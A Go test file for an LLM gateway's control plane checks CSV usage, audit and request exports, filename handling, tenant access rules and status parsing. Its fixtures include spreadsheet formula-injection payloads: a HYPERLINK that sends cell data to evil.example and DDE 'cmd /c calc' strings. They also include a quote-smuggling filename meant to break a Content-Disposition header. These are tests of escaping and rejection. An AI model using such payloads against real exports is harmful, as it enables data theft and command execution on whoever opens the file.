package control

import (
	"encoding/csv"
	"encoding/json"
	"log/slog"
	"mime"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/bespinian/keera-gateway/internal/authn"
	"github.com/bespinian/keera-gateway/internal/httpx"
	"github.com/bespinian/keera-gateway/internal/store"
)

// Every grouping resolves to a name, and an id with no row behind it is shown
// as it is.
func TestGroupLabelsResolveEveryGrouping(t *testing.T) {
	g := groupLabels{
		projects: map[string]string{"project_1": "Payments Platform"},
		keys:     map[string]string{"key_1": "a developer's laptop"},
		users:    map[string]string{"user_1": "first.last@example.ch"},
	}
	tests := []struct{ groupBy, id, want string }{
		{"project", "project_1", "Payments Platform"},
		{"key", "key_1", "a developer's laptop"},
		{"user", "user_1", "first.last@example.ch"},
		{"model", "keera-code", "keera-code"},
		{"day", "2026-09-06", "2026-09-06"},
		// A key whose organisation was purged: the usage row outlives it.
		{"key", "key_gone", "key_gone"},
		// Real traffic with no project: a key issued organisation-wide.
		{"project", "", "(none)"},
	}
	for _, tc := range tests {
		if got := g.label(tc.groupBy, tc.id); got != tc.want {
			t.Errorf("label(%q, %q) = %q, want %q", tc.groupBy, tc.id, got, tc.want)
		}
	}
}

// A chargeback is reconciled in a spreadsheet, so the export carries the name,
// the id and the plain amount, not the panel's formatted money.
func TestUsageCSVCarriesNamesIdsAndCost(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	from := time.Date(2026, 8, 1, 0, 0, 0, 0, time.UTC)
	to := time.Date(2026, 9, 1, 0, 0, 0, 0, time.UTC)

	s.usageCSV(w, "org_1", "project", from, to, []store.UsageBucket{
		{Group: "project_1", Requests: 12, InputTokens: 900, OutputTokens: 100, CostMicros: 2_500_000},
		{Group: "", Requests: 1, CostMicros: 0},
	}, groupLabels{projects: map[string]string{"project_1": "Payments Platform"}})

	if ct := w.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/csv") {
		t.Errorf("Content-Type = %q, want text/csv", ct)
	}
	if cd := w.Header().Get("Content-Disposition"); !strings.Contains(cd, "attachment") {
		t.Errorf("Content-Disposition = %q; a report has to arrive as a file", cd)
	}

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 3 {
		t.Fatalf("got %d rows, want a header and two", len(rows))
	}
	if rows[0][0] != "project" || rows[0][5] != "cost" {
		t.Errorf("header = %v, want it named by the grouping", rows[0])
	}
	if rows[1][0] != "Payments Platform" || rows[1][1] != "project_1" {
		t.Errorf("row = %v, want both the name and the id it resolves", rows[1])
	}
	if rows[1][5] != "2.50" {
		t.Errorf("cost = %q, want 2.50", rows[1][5])
	}
	if rows[2][0] != "(none)" {
		t.Errorf("an ungrouped row = %q, want it named", rows[2][0])
	}
}

func TestUsageRefusesAnUnknownGrouping(t *testing.T) {
	// The store falls back to its default grouping, which would answer a
	// different question and put the caller's string in the CSV filename.
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodGet, `/v1/usage?format=csv&group_by=x.bat%22%3Bx%3D%22`, nil)

	s.usage(w, r, &authn.Principal{Role: authn.RoleMember, OrgID: "org_1"})

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", w.Code)
	}
	if !strings.Contains(w.Body.String(), "group_by") {
		t.Errorf("body = %q, want it to name the parameter and the values it takes",
			w.Body.String())
	}
}

func TestBeginCSVFilenameCannotBeBrokenOutOf(t *testing.T) {
	// The usage export's filename comes from the caller's grouping. Besides
	// the handler's check, a quote must not close the parameter and add
	// another.
	w := httptest.NewRecorder()
	beginCSV(w, `x.bat";x="`)

	cd := w.Header().Get("Content-Disposition")
	if !strings.HasPrefix(cd, "attachment;") {
		t.Fatalf("Content-Disposition = %q; a report has to arrive as a file", cd)
	}
	_, params, err := mime.ParseMediaType(cd)
	if err != nil {
		t.Fatalf("Content-Disposition = %q does not parse: %v", cd, err)
	}
	if len(params) != 1 {
		t.Errorf("Content-Disposition = %q carries %d parameters, want only filename", cd, len(params))
	}
	if got := params["filename"]; got != `x.bat";x="` {
		t.Errorf("filename = %q, want the name given back whole and inert", got)
	}
}

func TestAuditCSVKeepsTheDetailIntact(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	ts := time.Date(2026, 9, 6, 14, 30, 0, 0, time.UTC)

	s.auditCSV(w, []store.AuditEntry{{
		ID: 7, TS: ts, Actor: "first.last@example.ch", Action: "guardrail.put",
		TargetType: "project", TargetID: "project_1",
		Detail: json.RawMessage(`{"rpm":120,"budget_micros":500000000}`),
	}})

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 2 {
		t.Fatalf("got %d rows, want a header and one", len(rows))
	}
	if rows[1][0] != ts.Format(time.RFC3339) {
		t.Errorf("timestamp = %q, want RFC3339", rows[1][0])
	}
	if rows[1][1] != "first.last@example.ch" || rows[1][2] != "guardrail.put" {
		t.Errorf("row = %v", rows[1])
	}
	var detail map[string]any
	if err := json.Unmarshal([]byte(rows[1][5]), &detail); err != nil {
		t.Fatalf("the detail did not survive the export: %v", err)
	}
	if detail["rpm"] != float64(120) {
		t.Errorf("detail = %v, want the limits that were set", detail)
	}
}

// A check reaches a backend directly on the model's own credential. That is
// work for whoever runs the model: an operator, or the administrators of an
// organisation's own. A member runs none.
func TestCheckModelIsForWhoeverRunsTheModel(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodPost, httpx.ControlPrefix+"/v1/models/keera-code/check?org_id=org_1", nil)

	s.checkModel(w, r, &authn.Principal{Role: authn.RoleMember, OrgID: "org_1"})

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403", w.Code)
	}
	if !strings.Contains(w.Body.String(), "only an administrator") {
		t.Errorf("body = %q, want it to say who may run one", w.Body.String())
	}
}

// A name is written by whoever administers an organisation, and the export is
// opened by whoever administers the deployment. Nothing either of them typed
// may arrive as a formula.
func TestCSVExportsCannotCarryAFormula(t *testing.T) {
	tests := []struct{ name, field, want string }{
		{
			"a formula", `=HYPERLINK("http://evil.example/?"&A1,"invoice")`,
			`'=HYPERLINK("http://evil.example/?"&A1,"invoice")`,
		},
		{"the DDE form", `=cmd|' /c calc'!A1`, `'=cmd|' /c calc'!A1`},
		{"a lookup", "@SUM(A1:A9)", "'@SUM(A1:A9)"},
		{"a leading tab", "\tSUM", "'\tSUM"},
		{"a leading carriage return", "\r=SUM", "'\r=SUM"},
		{"a signed expression", "-1+cmd|' /c calc'!A1", "'-1+cmd|' /c calc'!A1"},
		{"a plain name", "Payments Platform", "Payments Platform"},
		{"an email address", "first.last@example.ch", "first.last@example.ch"},
		{"an empty field", "", ""},
		// Money and token counts must still read as numbers, so their sign stays.
		{"a negative amount", "-2.50", "-2.50"},
		{"a signed integer", "+12", "+12"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := csvSafe(tc.field); got != tc.want {
				t.Errorf("csvSafe(%q) = %q, want %q", tc.field, got, tc.want)
			}
		})
	}
}

// The escape has to be applied by the writer both exports share, not remembered
// column by column.
func TestAuditCSVEscapesEveryFieldItIsGiven(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()

	s.auditCSV(w, []store.AuditEntry{{
		ID: 7, TS: time.Date(2026, 9, 6, 14, 30, 0, 0, time.UTC),
		Actor: `=1+1`, Action: "guardrail.put", TargetType: "project", TargetID: `@A1`,
		Detail: json.RawMessage(`{"system_prompt":"=1+1"}`),
	}})

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 2 {
		t.Fatalf("got %d rows, want a header and one", len(rows))
	}
	if rows[1][1] != `'=1+1` || rows[1][4] != `'@A1` {
		t.Errorf("row = %q; every field goes through the escape, not just the ones "+
			"somebody remembered", rows[1])
	}
	// The detail is JSON, so it starts with a brace and is left alone for a
	// compliance reader to parse.
	if rows[1][5] != `{"system_prompt":"=1+1"}` {
		t.Errorf("detail = %q, want it intact", rows[1][5])
	}
}

// The export goes to whoever runs the failing endpoint, so it carries the
// message they will recognise, and names beside ids, which mean nothing to
// them.
func TestRequestsCSVCarriesTheMessageAndTheNames(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	ts := time.Date(2026, 9, 6, 14, 30, 0, 0, time.UTC)

	s.requestsCSV(w, []store.Request{{
		ID: 9, TS: ts, Alias: "keera-code", Status: 500,
		Error: "CUDA out of memory", KeyID: "key_1", ProjectID: "project_1", UserID: "user_1",
		LatencyMS: 1200, Stream: true,
	}}, groupLabels{
		projects: map[string]string{"project_1": "Payments Platform"},
		keys:     map[string]string{"key_1": "a developer's laptop"},
		users:    map[string]string{"user_1": "first.last@example.ch"},
	})

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 2 {
		t.Fatalf("got %d rows, want a header and one", len(rows))
	}
	if rows[1][0] != ts.Format(time.RFC3339) || rows[1][1] != "keera-code" || rows[1][2] != "500" {
		t.Errorf("row = %v, want when, which model and which status", rows[1])
	}
	if rows[1][3] != "CUDA out of memory" {
		t.Errorf("message = %q; without it the row says only that something failed", rows[1][3])
	}
	if rows[1][4] != "a developer's laptop" || rows[1][5] != "key_1" {
		t.Errorf("row = %v, want both the key's name and the id it resolves", rows[1])
	}
	if rows[1][6] != "Payments Platform" || rows[1][7] != "first.last@example.ch" {
		t.Errorf("row = %v, want the project and the person it happened to", rows[1])
	}
}

// A member reads the request log too, but only the requests of their own
// keys. Naming someone else is refused, not quietly answered with their own.
func TestAMemberCannotReadSomebodyElsesRequests(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	for name, h := range map[string]handler{
		"the log":    s.requests,
		"the stream": s.requestStream,
		"sessions":   s.sessions,
	} {
		w := invoke(h, member("org_1"), http.MethodGet, "/v1/requests?user_id=user_other", "")
		if w.Code != http.StatusForbidden {
			t.Errorf("%s answered a member asking for someone else %d, want 403", name, w.Code)
		}
		if !strings.Contains(w.Body.String(), "their own keys") {
			t.Errorf("%s said %q, want it to say what a member may read", name, w.Body.String())
		}
	}
}

// Without a person behind it there are no keys of one's own to narrow to.
func TestAMemberWithoutAUserReadsNoRequests(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	nobody := &authn.Principal{Via: authn.MethodSession, Role: authn.RoleMember, OrgID: "org_1"}
	for name, h := range map[string]handler{
		"the log":     s.requests,
		"the stream":  s.requestStream,
		"sessions":    s.sessions,
		"one session": s.session,
		"the map":     s.trafficMap,
	} {
		if w := invoke(h, nobody, http.MethodGet, "/v1/requests", ""); w.Code != http.StatusForbidden {
			t.Errorf("%s answered %d, want 403", name, w.Code)
		}
	}
}

// The entity screens send an id in a query parameter, so checking it is what
// keeps one tenant out of another's numbers. An operator reads every one.
func TestEntityScopeReadsTheIdsAsGiven(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodGet,
		"/v1/overview?project_id=project_1&key_id=key_1&alias=keera-code&user_id=user_1", nil)

	// An empty organisation is the operator looking across tenants: nothing to
	// check an id against, and every tenant theirs to read.
	sc, ok := s.entityScope(w, r, "")
	if !ok {
		t.Fatalf("an operator was refused: %d %s", w.Code, w.Body.String())
	}
	if sc.ProjectID != "project_1" || sc.KeyID != "key_1" ||
		sc.Alias != "keera-code" || sc.UserID != "user_1" {
		t.Errorf("scope = %+v, want every narrowing carried through", sc)
	}
	if sc.Empty() {
		t.Error("a scope with four ids in it reports itself as empty")
	}
	if !(store.ReportScope{}).Empty() {
		t.Error("the zero scope has to be the dashboard's, which narrows nothing")
	}
}

// The export is opened in a spreadsheet, and the message and the names in it
// are written by somebody else.
func TestRequestsCSVCarriesTheNumbersAndEscapesTheWording(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	ts := time.Date(2026, 9, 6, 14, 30, 0, 0, time.UTC)

	s.requestsCSV(w, []store.Request{{
		ID: 9, TS: ts, Alias: "keera-code", Status: 200,
		KeyID: "key_1", ProjectID: "project_1", UserID: "user_1",
		InputTokens: 1000, OutputTokens: 200, CostMicros: 2_500_000,
		LatencyMS: 4000, TTFTMS: 300, Stream: true,
	}, {
		ID: 10, TS: ts, Alias: "keera-code", Status: 500,
		Error: `=cmd|' /c calc'!A1`,
	}}, groupLabels{
		projects: map[string]string{"project_1": "Payments Platform"},
		keys:     map[string]string{"key_1": "a developer's laptop"},
		users:    map[string]string{"user_1": "first.last@example.ch"},
	})

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 3 {
		t.Fatalf("got %d rows, want a header and two", len(rows))
	}
	if rows[0][10] != "cost" {
		t.Errorf("header = %v, want the cost in the eleventh column", rows[0])
	}
	if rows[1][8] != "1000" || rows[1][9] != "200" || rows[1][10] != "2.50" {
		t.Errorf("row = %v, want the tokens and the cost that explain each other", rows[1])
	}
	if rows[1][12] != "300" {
		t.Errorf("ttft = %q; a model that has gone slow is only visible in it", rows[1][12])
	}
	if rows[2][3] != `'=cmd|' /c calc'!A1` {
		t.Errorf("message = %q, want it escaped", rows[2][3])
	}
}

// The status filter takes one code or a whole class, so a reader can ask for
// every 5xx without knowing which ones their backends send.
func TestParseStatusReadsAClassAsWellAsACode(t *testing.T) {
	for _, tc := range []struct {
		in           string
		exact, class int
	}{
		{"", 0, 0},
		{"503", 503, 0},
		{"5xx", 0, 5},
		{"4XX", 0, 4},
		{"2xx", 0, 2},
		// Neither a code nor a class: no filter, rather than a wrong one.
		{"failed", 0, 0},
		{"9xx", 0, 0},
		{"xx", 0, 0},
	} {
		exact, class := parseStatus(tc.in)
		if exact != tc.exact || class != tc.class {
			t.Errorf("parseStatus(%q) = %d/%d, want %d/%d",
				tc.in, exact, class, tc.exact, tc.class)
		}
	}
}
